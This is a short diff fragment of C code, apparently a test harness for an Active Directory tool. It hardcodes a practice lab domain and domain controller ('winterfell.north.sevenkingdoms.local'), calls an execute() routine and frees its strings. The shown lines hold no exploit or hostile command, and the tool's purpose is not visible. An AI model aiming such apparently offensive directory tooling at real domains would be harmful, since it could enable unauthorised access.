+        domainDN = L"DC=north,DC=sevenkingdoms,DC=local";
+        domainController = L"winterfell.north.sevenkingdoms.local";
+    }
+
+    execute( userDN, domainDN, domainController );
+
+END:
+    if ( argc == 4 )
+    {
+        if ( userDN )
+        {
+            intFree( userDN );
+        }
+        if ( domainDN )
+        {
+            intFree( domainDN );
+        }
+        if ( domainController )
+        {
+            intFree( domainController );
+        }
+    }
+
     return 0;
 }
 #endif
